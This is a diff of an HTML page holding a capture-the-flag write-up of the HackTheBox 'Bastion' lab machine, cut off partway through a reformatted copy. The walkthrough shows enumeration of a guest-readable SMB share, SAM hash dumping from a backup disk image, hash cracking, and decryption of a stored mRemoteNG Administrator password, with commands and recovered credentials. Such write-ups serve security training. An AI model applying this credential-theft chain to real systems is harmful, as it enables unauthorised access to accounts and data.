@@ -1,325 +1,139 @@
-<!doctype html><html lang=en>
-<head>
-<meta charset=utf-8>
-<meta http-equiv=x-ua-compatible content="ie=edge">
-<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
-<meta name=author content="DezeStijn">
-<meta name=description content="Write-up of the Bastion lab machine by L4mpje on HackTheBox.eu.">
-<meta name=keywords content="Sequr,blog,writeup,CTF,challenge,machine,infosec,IT security,hacking,pentesting,cybersecurity,HackTheBox.eu,Machine,Bastion,L4mpje">
-<meta name=robots content="noodp">
-<meta name=theme-color content="#252627">
-<link rel=canonical href=https://sequr.be/blog/2019/08/bastion/>
-<title>
-Bastion :: Sequr
-</title>
-<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
-<link rel=stylesheet href=https://sequr.be/main.031a8efc33f94f55a4071bf4e91596478a5809fc8c148fab113801189cfd2152.css>
-<link rel=stylesheet type=text/css href=https://sequr.be/css/table.css>
-<link rel=stylesheet type=text/css href=https://sequr.be/css/menu.css>
-<link rel=apple-touch-icon sizes=180x180 href=https://sequr.be/apple-touch-icon.png>
-<link rel=icon type=image/png sizes=32x32 href=https://sequr.be/favicon-32x32.png>
-<link rel=icon type=image/png sizes=16x16 href=https://sequr.be/favicon-16x16.png>
-<link rel=manifest href=https://sequr.be/site.webmanifest>
-<link rel=mask-icon href=https://sequr.be/safari-pinned-tab.svg color=#e68101>
-<link rel="shortcut icon" href=https://sequr.be/favicon.ico>
-<meta name=msapplication-TileColor content="#e68101">
-<meta name=theme-color content="#e68101">
-<meta itemprop=name content="Bastion">
-<meta itemprop=description content="Write-up of the Bastion lab machine by L4mpje on HackTheBox.eu."><meta itemprop=datePublished content="2019-08-07T21:00:51+00:00">
-<meta itemprop=dateModified content="2019-08-07T21:00:51+00:00">
-<meta itemprop=wordCount content="1016"><meta itemprop=image content="https://sequr.be/img/htb-bastion.png">
-<meta itemprop=keywords content="HackTheBox.eu,Machine,Bastion,L4mpje,">
-<meta name=twitter:card content="summary_large_image">
-<meta name=twitter:image content="https://sequr.be/img/htb-bastion.png">
-<meta name=twitter:title content="Bastion">
-<meta name=twitter:description content="Write-up of the Bastion lab machine by L4mpje on HackTheBox.eu.">
-<meta property="article:section" content="Writeup">
-<meta property="article:section" content="Hack The Box">
-<meta property="article:published_time" content="2019-08-07 21:00:51 +0000 UTC">
-</head>
-<body>
-<div class=container>
-<header class=header>
-<span class=header__inner>
-<a href=https://sequr.be/ style=text-decoration:none>
-<div class=logo>
-<span class=logo__mark>$</span>
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="DezeStijn"><meta name=description content="Write-up of the Bastion lab machine by L4mpje on HackTheBox.eu."><meta name=keywords content="Sequr,blog,writeup,CTF,challenge,machine,infosec,IT security,hacking,pentesting,cybersecurity,HackTheBox.eu,Machine,Bastion,L4mpje"><meta name=robots content="noodp"><meta name=theme-color content="#252627"><link rel=canonical href=https://sequr.be/blog/2019/08/bastion/><title>Bastion :: Sequr</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=https://sequr.be/main.031a8efc33f94f55a4071bf4e91596478a5809fc8c148fab113801189cfd2152.css><link rel=stylesheet type=text/css href=https://sequr.be/css/table.css><link rel=stylesheet type=text/css href=https://sequr.be/css/menu.css><link rel=apple-touch-icon sizes=180x180 href=https://sequr.be/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://sequr.be/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://sequr.be/favicon-16x16.png><link rel=manifest href=https://sequr.be/site.webmanifest><link rel=mask-icon href=https://sequr.be/safari-pinned-tab.svg color=#e68101><link rel="shortcut icon" href=https://sequr.be/favicon.ico><meta name=msapplication-TileColor content="#e68101"><meta name=theme-color content="#e68101"><meta itemprop=name content="Bastion"><meta itemprop=description content="Write-up of the Bastion lab machine by L4mpje on HackTheBox.eu."><meta itemprop=datePublished content="2019-08-07T21:00:51+00:00"><meta itemprop=dateModified content="2019-08-07T21:00:51+00:00"><meta itemprop=wordCount content="1016"><meta itemprop=image content="https://sequr.be/img/htb-bastion.png"><meta itemprop=keywords content="HackTheBox.eu,Machine,Bastion,L4mpje,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://sequr.be/img/htb-bastion.png"><meta name=twitter:title content="Bastion"><meta name=twitter:description content="Write-up of the Bastion lab machine by L4mpje on HackTheBox.eu."><meta property="article:section" content="Writeup"><meta property="article:section" content="Hack The Box"><meta property="article:published_time" content="2019-08-07 21:00:51 +0000 UTC"></head><body><div class=container><header class=header><span class=header__inner><a href=https://sequr.be/ style=text-decoration:none><div class=logo><span class=logo__mark>$</span>
 <span class=logo__text>nc sequr.be 1337</span>
-<span class=logo__cursor style=background-color:#e68101>
-</span>
-</div>
-</a>
-<span class=header__right>
-<nav class=menu>
-<ul class=menu__inner><li><a href=https://sequr.be/blog/>Blog</a></li><li><a href=https://sequr.be/about/>About</a></li><li><a href=https://sequr.be/shoppinglist/>Shopping</a></li><li><a href=https://sequr.be/privacy/>Privacy</a></li>
-</ul>
-</nav>
-<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
-</span>
-<span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span>
-</span>
-</span>
-</header>
-<div class=content>
-<main class=post>
-<div class=post-info>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-5 minutes
-</p>
-</div>
-<article>
-<h1 class=post-title>
-<a href=https://sequr.be/blog/2019/08/bastion/>Bastion</a>
-</h1>
-<div class=post-content>
-<p><em><strong>Note to fellow-HTBers:</strong> Only write-ups of retired HTB machines or challenges are allowed.</em></p>
-<h2 id=machine-info>Machine Info <a href=#machine-info>¶</a></h2><p><a href=https://www.hackthebox.eu/home/machines/profile/186 target=_blank rel=noopener>Bastion</a> by <a href=https://www.hackthebox.eu/home/users/profile/29267 target=_blank rel=noopener>L4mpje</a><br>
-IP: 10.10.10.134<br>
-OS: linux</p>
-<h2 id=recon>Recon <a href=#recon>¶</a></h2><h3 id=nmap>Nmap <a href=#nmap>¶</a></h3><p>As usual, we kick off with a Nmap scan.</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ nmap -v -p- -T3 -oN nmap-tcp-allports 10.10.10.134
- Nmap scan report <span class=k>for</span> 10.10.10.134
- Host is up <span class=o>(</span>0.028s latency<span class=o>)</span>.
- Not shown: <span class=m>65522</span> closed ports
- PORT      STATE SERVICE
- 22/tcp    open  ssh
- 135/tcp   open  msrpc
- 139/tcp   open  netbios-ssn
- 445/tcp   open  microsoft-ds
- 5985/tcp  open  wsman
- 47001/tcp open  winrm
- 49664/tcp open  unknown
- 49665/tcp open  unknown
- 49666/tcp open  unknown
- 49667/tcp open  unknown
- 49668/tcp open  unknown
- 49669/tcp open  unknown
- 49670/tcp open  unknown
-</code></pre></div><p>I run Nmap with the following parameters:</p>
-<ul>
-<li><code>-v</code>: run verbose (show more output)</li>
-<li><code>-p-</code>: scan all ports, equals 1-65535</li>
-<li><code>-T3</code>: run on normal speed (can be omitted, since this is the default speed)</li>
-<li><code>-oN nmap-tcp-allports</code>: save output in normal format with said filename</li>
-<li><code>10.10.10.134</code>: host to scan</li>
-</ul>
-<p>Note that SSH and SMB are exposed, as well as some other irrelevant services.</p>
-<h3 id=smb>SMB <a href=#smb>¶</a></h3><p>Let’s check out if we can find some open shares.</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ nmap --script smb-enum-shares -p 139,445 10.10.10.134
- Nmap scan report <span class=k>for</span> 10.10.10.134
- Host is up <span class=o>(</span>0.026s latency<span class=o>)</span>.
- PORT  STATE SERVICE
- 139/tcp open netbios-ssn
- 445/tcp open microsoft-ds
- Host script results:
- <span class=p>|</span> smb-enum-shares: 
- <span class=p>|</span>  account_used: guest
- <span class=p>|</span>  <span class=se>\1</span>0.10.10.134<span class=se>\A</span>DMIN$: 
- <span class=p>|</span>   Type: STYPE_DISKTREE_HIDDEN
- <span class=p>|</span>   Comment: Remote Admin
- <span class=p>|</span>   Anonymous access: 
- <span class=p>|</span>   Current user access: 
- <span class=p>|</span>  <span class=se>\1</span>0.10.10.134<span class=se>\B</span>ackups: 
- <span class=p>|</span>   Type: STYPE_DISKTREE
- <span class=p>|</span>   Comment: 
- <span class=p>|</span>   Anonymous access: 
- <span class=p>|</span>   Current user access: READ
- <span class=p>|</span>  <span class=se>\1</span>0.10.10.134<span class=se>\C</span>$: 
- <span class=p>|</span>   Type: STYPE_DISKTREE_HIDDEN
- <span class=p>|</span>   Comment: Default share
- <span class=p>|</span>   Anonymous access: 
- <span class=p>|</span>   Current user access: 
- <span class=p>|</span>  <span class=se>\1</span>0.10.10.134<span class=se>\I</span>PC$: 
- <span class=p>|</span>   Type: STYPE_IPC_HIDDEN
- <span class=p>|</span>   Comment: Remote IPC
- <span class=p>|</span>   Anonymous access: 
- <span class=p>|</span>_  Current user access: READ/WRITE
-</code></pre></div><p>As you can see, the <em>guest</em> account has read access on the <em>Backups</em> share. This sounds like something worth investigating further.</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ sudo smbmap -s Backups -R -H 10.10.10.134 -u guest <span class=p>|</span> tee -a smbmap
- <span class=o>[</span>+<span class=o>]</span> Finding open SMB ports….
- <span class=o>[</span>+<span class=o>]</span> User SMB session establishd on 10.10.10.134…
- <span class=o>[</span>+<span class=o>]</span> IP: 10.10.10.134:445    Name: 10.10.10.134                    
- Disk                         Permissions
- ----                         -----------
- Backups                      READ, WRITE
- <span class=o>[</span>!<span class=o>]</span> Unable to remove <span class=nb>test</span> directory at <span class=se>\1</span>0.10.10.134<span class=se>\B</span>ackups<span class=se>\t</span>zRrGnGVfe, plreae remove manually
- .<span class=se>\
-</span><span class=se></span> dr--r--r--        <span class=m>0</span> Fri Aug <span class=m>2</span> 11:09:06 <span class=m>2019</span>    .
- dr--r--r--        <span class=m>0</span> Fri Aug <span class=m>2</span> 11:09:06 <span class=m>2019</span>    ..
- -r--r--r--       <span class=m>260</span> Fri Aug <span class=m>2</span> 11:00:50 <span class=m>2019</span>    nmap-test-file
- -w--w--w--       <span class=m>116</span> Tue Apr <span class=m>16</span> 13:43:19 <span class=m>2019</span>    note.txt
- -r--r--r--        <span class=m>0</span> Fri Feb <span class=m>22</span> 13:43:28 <span class=m>2019</span>    SDT65CB.tmp
- dr--r--r--        <span class=m>0</span> Fri Aug <span class=m>2</span> 11:09:06 <span class=m>2019</span>    tzRrGnGVfe
- dr--r--r--        <span class=m>0</span> Fri Feb <span class=m>22</span> 13:44:02 <span class=m>2019</span>    WindowsImageBackup
- <span class=o>[</span> ... <span class=o>]</span>
- .<span class=se>\W</span>indowsImageBackup<span class=se>\L</span>4mpje-PC<span class=se>\B</span>ackup 2019-02-22 124351<span class=se>\
-</span><span class=se></span> dr--r--r--        <span class=m>0</span> Fri Feb <span class=m>22</span> 13:45:32 <span class=m>2019</span>    .
- dr--r--r--        <span class=m>0</span> Fri Feb <span class=m>22</span> 13:45:32 <span class=m>2019</span>    ..
- -r--r--r--        <span class=m>37761024</span> Fri Feb <span class=m>22</span> 13:44:03 <span class=m>2019</span>    9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
- -r--r--r--        <span class=m>5418299392</span> Fri Feb <span class=m>22</span> 13:45:32 <span class=m>2019</span>    9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
- -r--r--r--       <span class=m>1186</span> Fri Feb <span class=m>22</span> 13:45:32 <span class=m>2019</span>    BackupSpecs.xml
- <span class=o>[</span> ... <span class=o>]</span>
-</code></pre></div><p>Opening <em>note.txt</em>, you’ll find another clue on how you may want to continue.</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ smbclient //10.10.10.134/Backups -U guest
-smb: &gt; dir
-smb: &gt; get note.txt
-smb: &gt; <span class=nb>exit</span>
-
-$ cat note.txt
- Sysadmins: please don<span class=err>&#39;</span>t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
-</code></pre></div><p>So we want to have a look at the back-ups.</p>
-<h2 id=analysing-the-back-ups>Analysing the back-ups <a href=#analysing-the-back-ups>¶</a></h2><p>The small back-up file ‘9b9cfbc<strong>3</strong>-369e-11e9-a17c-806e6f6e6963.vhd’ is a recovery image, which Windows usually creates when you create a back-up image.</p>
-<p>The interesting image however is ‘9b9cfbc<strong>4</strong>-369e-11e9-a17c-806e6f6e6963.vhd’.
-As the note said, downloading this file might fail. In my case I was never able to download more than 75% of the vhd using the get command in smbclient.</p>
-<p>What worked for me is adding the share as a remote disk and using rsync to copy the image to my system (as rsync allows you to continue failed downloads) for analysis.<br>
-However, there are tools available which’ll allow you to browse through an image without having to download the whole image to your disk.</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ sudo mkdir /mnt/vhd
-$ sudo mount -t cifs -o <span class=nv>user</span><span class=o>=</span>guest //10.10.10.134/Backups /mnt/vhd/
-$ <span class=nb>cd</span> /mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup<span class=se>\ </span>2019-02-22<span class=se>\ </span>124351/
-$ rsync --append 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd ~/Documents/Projects/HackTheBox_eu/134-Bastion/
-$ sudo umount /mnt/vhd
-$ <span class=nb>cd</span>  ~/Documents/Projects/HackTheBox_eu/134-Bastion/
-$ sudo vhdimount 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd /mnt/vhd/
-$ <span class=nb>cd</span> /mnt/vhd/
-$ ls
-$ mmls -aB vhdi1
- DOS Partition Table
- Offset Sector: <span class=m>0</span>
- Units are in 512-byte sectors
- Slot   Start    End     Length    Size  Description
- 002: 000:000  <span class=m>0000000128</span>  <span class=m>0031248511</span>  <span class=m>0031248384</span>  0014G  NTFS / exFAT <span class=o>(</span>0x07<span class=o>)</span>
-$ <span class=nb>echo</span> 128*512 <span class=p>|</span> bc
- <span class=m>65536</span>
-$ sudo mkdir /mnt/dd
-$ sudo mount -o ro,noload,offset<span class=o>=</span><span class=m>65536</span> -t nfts vhdi1 /mnt/dd
-</code></pre></div><p>We can now browse through the contents of the image.</p>
-<h2 id=cracking-hashes>Cracking hashes <a href=#cracking-hashes>¶</a></h2><p>I start of by looking for password hashes.<br>
-These can be retrieved by cracking the SAM (Security Account Manager) file, which is located at <code>C:\Windows\System32\config</code>.</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ <span class=nb>cd</span> /mnt/dd/Windows/System32/config/
-$ samdump2 SYSTEM SAM &gt; ~/Documents/Projects/HackTheBox_eu/134-Bastion/hashes.txt
-$ cat ~/Documents/Projects/HackTheBox_eu/134-Bastion/hashes.txt
- *disabled * Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
- *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
- L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
-
-$ hashcat -m <span class=m>1000</span> -a <span class=m>0</span> SAM-hashes.txt
-$ cat ~/.hashcat/hashcat.potfile
- 26112010952d963c8dc4217daec986d9:bureaulampje
-</code></pre></div><p>We now have the password of the user <em>L4mpje</em> (&ldquo;lampje&rdquo; = &ldquo;small lightbulb&rdquo; in Dutch), which is <em>bureaulampje</em> (&ldquo;small desk lamp&rdquo; in Dutch).</p>
-<h2 id=-got-the-user-flag>$ Got the user flag <a href=#-got-the-user-flag>¶</a></h2><p>I use this password to SSH onto the box and find the users.txt file containing the flag on the user’s desktop.</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ssh L4mpje@10.10.10.134 <span class=c1># enter password bureaulampje</span>
-L4mpje@BASTION C:<span class=se>\U</span>sers<span class=se>\L</span>4mpje&gt; <span class=nb>type</span> C:<span class=se>\U</span>sers<span class=se>\L</span>4mpje<span class=se>\D</span>esktop<span class=se>\u</span>sers.txt
- 9bfe57d5c3309db3a151772f9d86c6cd
-</code></pre></div><h2 id=-going-for-the-root-flag># Going for the root flag <a href=#-going-for-the-root-flag>¶</a></h2><p>While browsing through the filesystem, I noticed mRemoteNG was installed.<br>
-This is also confirmed by running this small line of PowerShell:</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>L4mpje@BASTION C:<span class=se>\U</span>sers<span class=se>\L</span>4mpje<span class=se>\D</span>ownloads&gt; powershell
-PS C:<span class=se>\U</span>sers<span class=se>\L</span>4mpje<span class=se>\D</span>ownloads&gt; Get-ItemProperty HKLM:<span class=se>\S</span>oftware<span class=se>\W</span>ow6432Node<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\C</span>urrentVersion<span class=se>\U</span>ninstall<span class=se>\*</span> <span class=p>|</span> Select-Object DisplayName, DisplayVersion, Publisher, InstallDate <span class=p>|</span> Format-Table –AutoSize
-
-DisplayName                                                    DisplayVersion Publisher                InstallDate              
------------                                                    -------------- ---------                -----------              
-mRemoteNG                                                      1.76.11.40527  Next Generation Software <span class=m>20190222</span>                 
-Microsoft Visual C++ <span class=m>2008</span> Redistributable - x86 9.0.30729.6161 9.0.30729.6161 Microsoft Corporation    <span class=m>20190416</span>
-</code></pre></div><p>Searching for vulnerabilities on <a href=https://www.exploit-db.com/ target=_blank rel=noopener>exploit-db</a> didn’t reveal anything,
-but a quick Google search did bring me to an interesting <a href=https://www.reddit.com/r/mRemoteNG/comments/66hzoe/mremoteng_password_storage_is_insecure/ target=_blank rel=noopener>Reddit post</a>.<br>
-The Ruby script in the post didn’t seem to work for me, but I finally found a <a href=https://github.com/kmahyyg/mremoteng-decrypt target=_blank rel=noopener>Python script on GitHub</a> which did.</p>
-<p>I downloaded confCons.xml from the host and ran the script to find the password for the Administrator account.
-I then logged in onto the hosting using the Administrator password to retrieve the flag from the Administrator’s desktop.</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ scp -T L4mpje@10.10.10.134:<span class=s2>&#34;C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml&#34;</span> ./
-$ cat confCons.xml
-$ python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw<span class=o>==</span>
- Password: thXLHM96BeKL0ER2
-
-$ ssh Administrator@10.10.10.134
-administrator@BASTION C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator&gt; <span class=nb>type</span> Desktop<span class=se>\r</span>oot.txt
- 958850b91811676ed6620a9c430e65c8
-</code></pre></div><blockquote>
-<p>Whatever you are, be a good one.<br>
-~ Abraham Lincoln</p>
-</blockquote>
-</div>
-</article>
-<hr>
-<div class=post-info>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
-<span class=tag><a href=https://sequr.be/tags/hackthebox.eu/>HackTheBox.eu</a></span>
+<span class=logo__cursor style=background-color:#e68101></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://sequr.be/blog/>Blog</a></li><li><a href=https://sequr.be/about/>About</a></li><li><a href=https://sequr.be/shoppinglist/>Shopping</a></li><li><a href=https://sequr.be/privacy/>Privacy</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>5 minutes</p></div><article><h1 class=post-title><a href=https://sequr.be/blog/2019/08/bastion/>Bastion</a></h1><div class=post-content><p><em><strong>Note to fellow-HTBers:</strong> Only write-ups of retired HTB machines or challenges are allowed.</em></p><h2 id=machine-info>Machine Info <a href=#machine-info>¶</a></h2><p><a href=https://www.hackthebox.eu/home/machines/profile/186 target=_blank rel=noopener>Bastion</a> by <a href=https://www.hackthebox.eu/home/users/profile/29267 target=_blank rel=noopener>L4mpje</a><br>IP: 10.10.10.134<br>OS: linux</p><h2 id=recon>Recon <a href=#recon>¶</a></h2><h3 id=nmap>Nmap <a href=#nmap>¶</a></h3><p>As usual, we kick off with a Nmap scan.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nmap -v -p- -T3 -oN nmap-tcp-allports 10.10.10.134
+</span></span><span class=line><span class=cl> Nmap scan report <span class=k>for</span> 10.10.10.134
+</span></span><span class=line><span class=cl> Host is up <span class=o>(</span>0.028s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl> Not shown: <span class=m>65522</span> closed ports
+</span></span><span class=line><span class=cl> PORT      STATE SERVICE
+</span></span><span class=line><span class=cl> 22/tcp    open  ssh
+</span></span><span class=line><span class=cl> 135/tcp   open  msrpc
+</span></span><span class=line><span class=cl> 139/tcp   open  netbios-ssn
+</span></span><span class=line><span class=cl> 445/tcp   open  microsoft-ds
+</span></span><span class=line><span class=cl> 5985/tcp  open  wsman
+</span></span><span class=line><span class=cl> 47001/tcp open  winrm
+</span></span><span class=line><span class=cl> 49664/tcp open  unknown
+</span></span><span class=line><span class=cl> 49665/tcp open  unknown
+</span></span><span class=line><span class=cl> 49666/tcp open  unknown
+</span></span><span class=line><span class=cl> 49667/tcp open  unknown
+</span></span><span class=line><span class=cl> 49668/tcp open  unknown
+</span></span><span class=line><span class=cl> 49669/tcp open  unknown
+</span></span><span class=line><span class=cl> 49670/tcp open  unknown
+</span></span></code></pre></div><p>I run Nmap with the following parameters:</p><ul><li><code>-v</code>: run verbose (show more output)</li><li><code>-p-</code>: scan all ports, equals 1-65535</li><li><code>-T3</code>: run on normal speed (can be omitted, since this is the default speed)</li><li><code>-oN nmap-tcp-allports</code>: save output in normal format with said filename</li><li><code>10.10.10.134</code>: host to scan</li></ul><p>Note that SSH and SMB are exposed, as well as some other irrelevant services.</p><h3 id=smb>SMB <a href=#smb>¶</a></h3><p>Let’s check out if we can find some open shares.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nmap --script smb-enum-shares -p 139,445 10.10.10.134
+</span></span><span class=line><span class=cl> Nmap scan report <span class=k>for</span> 10.10.10.134
+</span></span><span class=line><span class=cl> Host is up <span class=o>(</span>0.026s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl> PORT  STATE SERVICE
+</span></span><span class=line><span class=cl> 139/tcp open netbios-ssn
+</span></span><span class=line><span class=cl> 445/tcp open microsoft-ds
+</span></span><span class=line><span class=cl> Host script results:
+</span></span><span class=line><span class=cl> <span class=p>|</span> smb-enum-shares: 
+</span></span><span class=line><span class=cl> <span class=p>|</span>  account_used: guest
+</span></span><span class=line><span class=cl> <span class=p>|</span>  <span class=se>\1</span>0.10.10.134<span class=se>\A</span>DMIN$: 
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Type: STYPE_DISKTREE_HIDDEN
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Comment: Remote Admin
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Anonymous access: 
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Current user access: 
+</span></span><span class=line><span class=cl> <span class=p>|</span>  <span class=se>\1</span>0.10.10.134<span class=se>\B</span>ackups: 
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Type: STYPE_DISKTREE
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Comment: 
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Anonymous access: 
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Current user access: READ
+</span></span><span class=line><span class=cl> <span class=p>|</span>  <span class=se>\1</span>0.10.10.134<span class=se>\C</span>$: 
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Type: STYPE_DISKTREE_HIDDEN
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Comment: Default share
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Anonymous access: 
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Current user access: 
+</span></span><span class=line><span class=cl> <span class=p>|</span>  <span class=se>\1</span>0.10.10.134<span class=se>\I</span>PC$: 
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Type: STYPE_IPC_HIDDEN
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Comment: Remote IPC
+</span></span><span class=line><span class=cl> <span class=p>|</span>   Anonymous access: 
+</span></span><span class=line><span class=cl> <span class=p>|</span>_  Current user access: READ/WRITE
+</span></span></code></pre></div><p>As you can see, the <em>guest</em> account has read access on the <em>Backups</em> share. This sounds like something worth investigating further.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo smbmap -s Backups -R -H 10.10.10.134 -u guest <span class=p>|</span> tee -a smbmap
+</span></span><span class=line><span class=cl> <span class=o>[</span>+<span class=o>]</span> Finding open SMB ports….
+</span></span><span class=line><span class=cl> <span class=o>[</span>+<span class=o>]</span> User SMB session establishd on 10.10.10.134…
+</span></span><span class=line><span class=cl> <span class=o>[</span>+<span class=o>]</span> IP: 10.10.10.134:445    Name: 10.10.10.134                    
+</span></span><span class=line><span class=cl> Disk                         Permissions
+</span></span><span class=line><span class=cl> ----                         -----------
+</span></span><span class=line><span class=cl> Backups                      READ, WRITE
+</span></span><span class=line><span class=cl> <span class=o>[</span>!<span class=o>]</span> Unable to remove <span class=nb>test</span> directory at <span class=se>\1</span>0.10.10.134<span class=se>\B</span>ackups<span class=se>\t</span>zRrGnGVfe, plreae remove manually
+</span></span><span class=line><span class=cl> .<span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span> dr--r--r--        <span class=m>0</span> Fri Aug <span class=m>2</span> 11:09:06 <span class=m>2019</span>    .
+</span></span><span class=line><span class=cl> dr--r--r--        <span class=m>0</span> Fri Aug <span class=m>2</span> 11:09:06 <span class=m>2019</span>    ..
+</span></span><span class=line><span class=cl> -r--r--r--       <span class=m>260</span> Fri Aug <span class=m>2</span> 11:00:50 <span class=m>2019</span>    nmap-test-file
+</span></span><span class=line><span class=cl> -w--w--w--       <span class=m>116</span> Tue Apr <span class=m>16</span> 13:43:19 <span class=m>2019</span>    note.txt
+</span></span><span class=line><span class=cl> -r--r--r--        <span class=m>0</span> Fri Feb <span class=m>22</span> 13:43:28 <span class=m>2019</span>    SDT65CB.tmp
+</span></span><span class=line><span class=cl> dr--r--r--        <span class=m>0</span> Fri Aug <span class=m>2</span> 11:09:06 <span class=m>2019</span>    tzRrGnGVfe
+</span></span><span class=line><span class=cl> dr--r--r--        <span class=m>0</span> Fri Feb <span class=m>22</span> 13:44:02 <span class=m>2019</span>    WindowsImageBackup
+</span></span><span class=line><span class=cl> <span class=o>[</span> ... <span class=o>]</span>
+</span></span><span class=line><span class=cl> .<span class=se>\W</span>indowsImageBackup<span class=se>\L</span>4mpje-PC<span class=se>\B</span>ackup 2019-02-22 124351<span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span> dr--r--r--        <span class=m>0</span> Fri Feb <span class=m>22</span> 13:45:32 <span class=m>2019</span>    .
+</span></span><span class=line><span class=cl> dr--r--r--        <span class=m>0</span> Fri Feb <span class=m>22</span> 13:45:32 <span class=m>2019</span>    ..
+</span></span><span class=line><span class=cl> -r--r--r--        <span class=m>37761024</span> Fri Feb <span class=m>22</span> 13:44:03 <span class=m>2019</span>    9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
